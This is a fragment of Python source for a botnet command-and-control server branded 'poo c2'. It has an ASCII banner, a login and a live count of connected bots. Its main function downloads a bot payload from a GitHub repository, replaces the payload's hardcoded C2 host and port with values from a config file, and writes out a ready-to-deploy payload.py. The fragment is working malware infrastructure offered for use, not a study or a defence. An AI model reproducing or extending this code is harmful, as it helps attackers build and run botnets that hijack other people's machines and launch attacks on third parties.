...
# Imports
import socket, threading, time, ipaddress, random, json, requests
...
banner2 = '''
     .d``                u.          u.  
     @8Ne.   .u    ...ue888b   ...ue888b 
     %8888:u@88N   888R Y888r  888R Y888r
      `888I  888.  888R I888>  888R I888>
       888I  888I  888R I888>  888R I888>
       888I  888I  888R I888>  888R I888>
     uW888L  888' u8888cJ888  u8888cJ888 
    '*88888Nu88P   "*888*P"    "*888*P"  
    ~ '88888F`       'Y"         'Y"     
       888 ^                             
       *8E            c2                   
       '8>         @poodrop.                    
...
def handle_client(client, address):
    send(client, "\33]0;poo c2 | Login\a")
    send(client, f'\x1bpoo c2 | Login: Awaiting Response...\a', False)
    send(client, ansi_clear, False)
...
def update_title(client, name, expires):
    while 1:
        try:
            send(client, f"\33]0;poo c2 | Bots online: {len(bots)} | Username: {name} | Expires: {expires} \a", False)
            time.sleep(0.6)
        except:
            client.close()
...
def command_line(client, username):
    ...
    prompt = f'{color("LIGHTBLSYN_EX")}╚{color("WHITE")}pooC2{color("LIGHTBLSYN_EX")}@{color("MAGENTA")}{username}{color("LIGHTBLSYN_EX")} > {color("LIGHTBLSYN_EX")}'
...
def main():
    kid = (requests.get('https://raw.githubusercontent.com/NixWasHere/NebulaC2/main/src/Payload/bot.py'))
    with open("src/config.json", encoding="utf-8") as jsonFile:
        jsonObject = json.load(jsonFile)
        jsonFile.close()

    payload_host = jsonObject['payload_host']
    cnc_port = int(jsonObject['cnc_port'])
    cnc_host = jsonObject['cnc_host']

    payloaddd = "payload.py"
    searchtext = """C2_ADDRESS  = "127.0.0.1"
C2_PORT     = 6667"""
    replacetext = f"""C2_ADDRESS  = "{payload_host}"
C2_PORT     = {cnc_port}"""

    with open(payloaddd, 'w') as file:
        file.write(kid.text)

    with open(payloaddd, 'r') as file:
        hostsnstuff = file.read()

        hostsnstuff = hostsnstuff.replace(searchtext, replacetext)
    with open(payloaddd, 'w') as file:
        file.write(hostsnstuff)
